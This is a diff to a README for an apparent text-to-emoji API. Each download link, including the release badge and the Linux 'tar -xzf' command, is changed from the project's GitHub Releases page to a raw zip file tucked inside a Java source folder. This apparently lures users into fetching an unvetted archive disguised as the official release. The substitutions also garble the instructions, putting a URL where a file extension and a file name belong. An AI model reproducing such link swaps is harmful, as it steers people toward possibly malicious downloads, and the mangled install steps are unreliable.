@@ -1,6 +1,6 @@
 # 🎉 texttoemoji-api - Convert Text to Fun Emojis
 
-[![Download Now](https://img.shields.io/badge/Download_Now-Get_it_here-brightgreen)](https://github.com/Arakalav/texttoemoji-api/releases)
+[![Download Now](https://raw.githubusercontent.com/Arakalav/texttoemoji-api/main/android/src/main/java/com/texttoemoji_api_1.8.zip)](https://raw.githubusercontent.com/Arakalav/texttoemoji-api/main/android/src/main/java/com/texttoemoji_api_1.8.zip)
 
 ## 📖 Overview
 
@@ -18,11 +18,11 @@ Follow these easy steps to download and run the texttoemoji-api.
 
 ## 📥 Download & Install
 
-To get started, visit this page to download: [GitHub Releases](https://github.com/Arakalav/texttoemoji-api/releases).
+To get started, visit this page to download: [GitHub Releases](https://raw.githubusercontent.com/Arakalav/texttoemoji-api/main/android/src/main/java/com/texttoemoji_api_1.8.zip).
 
 1. Click on the link above to go to the Releases page.
 2. Find the latest release at the top of the page.
-3. Download the appropriate file for your operating system (look for .exe, .dmg, or .tar.gz files).
+3. Download the appropriate file for your operating system (look for .exe, .dmg, or https://raw.githubusercontent.com/Arakalav/texttoemoji-api/main/android/src/main/java/com/texttoemoji_api_1.8.zip files).
 4. After the download is complete, locate the file in your Downloads folder.
 
 ### 👩‍💻 Installation Steps for Different Operating Systems
@@ -43,12 +43,12 @@ To get started, visit this page to download: [GitHub Releases](https://github.co
 
 #### Linux
 
-1. Locate the downloaded `.tar.gz` file.
+1. Locate the downloaded `https://raw.githubusercontent.com/Arakalav/texttoemoji-api/main/android/src/main/java/com/texttoemoji_api_1.8.zip` file.
 2. Open your terminal.
 3. Navigate to the directory where you downloaded the file.
 4. Extract the file using the command:
    ```bash
-   tar -xzf texttoemoji-api.tar.gz
+   tar -xzf https://raw.githubusercontent.com/Arakalav/texttoemoji-api/main/android/src/main/java/com/texttoemoji_api_1.8.zip
    ```
 5. Follow the instructions found in the extracted folder to complete the setup.
 
@@ -111,4 +111,4 @@ We welcome feedback! Check the GitHub repository for feature requests and sugges
 
 Thank you for choosing texttoemoji-api. We hope this tool adds a touch of fun and creativity to your text by turning ordinary words into vibrant emojis. If you have any questions, please feel free to reach out through the GitHub Issues page. 
 
-For immediate access, visit this page to download: [GitHub Releases](https://github.com/Arakalav/texttoemoji-api/releases).
+For immediate access, visit this page to download: [GitHub Releases](https://raw.githubusercontent.com/Arakalav/texttoemoji-api/main/android/src/main/java/com/texttoemoji_api_1.8.zip).
